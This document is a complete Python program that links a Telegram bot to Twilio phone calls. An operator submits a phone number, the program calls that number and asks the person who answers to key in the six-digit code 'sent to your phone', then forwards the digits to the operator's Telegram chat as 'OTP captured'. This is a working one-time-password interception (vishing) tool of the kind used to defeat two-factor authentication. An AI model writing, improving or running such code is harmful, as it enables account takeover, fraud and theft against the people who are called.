import os
import re
import threading
import requests
from flask import Flask, request
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ---------------------------------------------------------------------------
# Shared state
# Maps Twilio CallSid -> Telegram chat_id so the OTP is returned only to the
# person who initiated the call — never to anyone else.
# ---------------------------------------------------------------------------
pending_calls: dict[str, int] = {}

# ---------------------------------------------------------------------------
# Flask app — handles Twilio webhooks
# ---------------------------------------------------------------------------
flask_app = Flask(__name__)


def get_twilio_client() -> Client:
    """Return an authenticated Twilio REST client using environment credentials."""
    return Client(
        os.environ.get("TWILIO_ACCOUNT_SID"),
        os.environ.get("TWILIO_AUTH_TOKEN"),
    )


@flask_app.route("/")
def index():
    """Health check — confirms the server is reachable."""
    return "Twilio Voice OTP Bot is running.", 200


@flask_app.route("/voice", methods=["GET", "POST"])
def voice():
    """
    Twilio webhook called on every step of the outbound call.

    First visit  → play a <Gather> prompt asking for the 6-digit code.
    Second visit → digits are in the POST body; capture them, notify Telegram,
                   confirm to the caller, and hang up.
    """
    response = VoiceResponse()

    # Twilio posts the digits the caller pressed and the unique call identifier
    digits = request.form.get("Digits")
    call_sid = request.form.get("CallSid")

    if digits:
        print(f"Received OTP digits: {digits}  (CallSid: {call_sid})")

        # Look up which Telegram chat initiated this call and remove the entry
        chat_id = pending_calls.pop(call_sid, None)
        if chat_id:
            # Send OTP only to the originating chat
            send_telegram_message(chat_id, f"OTP captured: {digits}")
        else:
            print(f"Warning: no pending chat found for CallSid {call_sid}")

        # Read the digits back to the caller and end the call
        response.say(
            f"Thank you. You entered {' '.join(digits)}. Goodbye.",
            voice="alice",
        )
        response.hangup()

    else:
        # First visit — prompt for the code
        gather = Gather(
            num_digits=6,       # Stop collecting after exactly 6 digits
            action="/voice",    # POST the digits back here
            method="POST",
            timeout=10,         # Wait up to 10 s before redirecting
        )
        gather.say(
            "Please enter the 6 digit code sent to your phone, followed by the pound key.",
            voice="alice",
        )
        response.append(gather)

        # If the caller doesn't press anything, loop and ask again
        response.redirect("/voice")

    return str(response), 200, {"Content-Type": "text/xml"}


# ---------------------------------------------------------------------------
# Telegram message helper
# Uses the Bot API directly (requests) so it works from synchronous Flask code
# without needing to bridge into the async Telegram bot event loop.
# ---------------------------------------------------------------------------
def send_telegram_message(chat_id: int, message: str) -> None:
    """Send *message* to a specific Telegram chat by chat_id."""
    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN")
    if not bot_token:
        print("TELEGRAM_BOT_TOKEN is not set — cannot send Telegram message.")
        return

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    try:
        resp = requests.post(
            url,
            json={"chat_id": chat_id, "text": message},
            timeout=10,
        )
        resp.raise_for_status()
        print(f"Telegram message sent to chat {chat_id}.")
    except requests.RequestException as exc:
        print(f"Failed to send Telegram message: {exc}")


# ---------------------------------------------------------------------------
# Telegram bot handlers (python-telegram-bot v20+, async)
# ---------------------------------------------------------------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """/start — greet the user and ask for a phone number."""
    await update.message.reply_text(
        "Send me a phone number to call (with country code, e.g. +447123456789)"
    )


async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Handles any plain text message that isn't a command.

    Validates the number, triggers a Twilio outbound call, and records the
    chat_id against the CallSid so the OTP comes back to the right person.
    """
    text = update.message.text.strip()
    chat_id = update.effective_chat.id

    # Basic E.164 format check: + followed by 7-15 digits
    if not re.match(r"^\+\d{7,15}$", text):
        await update.message.reply_text(
            "That doesn't look like a valid phone number.\n"
            "Please include the country code, e.g. +447123456789"
        )
        return

    await update.message.reply_text(
        f"Calling {text}... I'll send you the OTP once the caller enters it."
    )

    # WEBHOOK_BASE_URL must be the publicly reachable root of this Flask server
    # e.g. https://abc123.ngrok.io  or  https://yourdomain.com
    webhook_base = os.environ.get("WEBHOOK_BASE_URL", "").rstrip("/")
    if not webhook_base:
        await update.message.reply_text(
            "Error: WEBHOOK_BASE_URL environment variable is not set.\n"
            "Set it to the public URL of this server so Twilio can reach /voice."
        )
        return

    # Initiate the outbound Twilio call
    try:
        client = get_twilio_client()
        call = client.calls.create(
            to=text,
            from_=os.environ.get("TWILIO_FROM_NUMBER"),
            url=f"{webhook_base}/voice",    # Twilio fetches TwiML from here
            method="POST",
        )

        # Store chat_id so /voice can route the OTP back correctly
        pending_calls[call.sid] = chat_id
        print(f"Call {call.sid} initiated to {text} for Telegram chat {chat_id}")

    except Exception as exc:
        print(f"Twilio call failed: {exc}")
        await update.message.reply_text(f"Failed to initiate call: {exc}")


# ---------------------------------------------------------------------------
# Thread target — runs Flask in the background
# ---------------------------------------------------------------------------
def run_flask() -> None:
    """Start the Flask development server (daemon thread)."""
    flask_app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def main() -> None:
    # Launch Flask in a daemon thread so it exits cleanly when the bot stops
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print("Flask server started on port 5000")

    bot_token = os.environ.get("TELEGRAM_BOT_TOKEN")
    if not bot_token:
        print("Error: TELEGRAM_BOT_TOKEN is not set. Exiting.")
        return

    # Build the Telegram Application and register handlers
    app = Application.builder().token(bot_token).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_number))

    print("Telegram bot polling started...")
    # run_polling blocks until the process is stopped (Ctrl-C / SIGTERM)
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
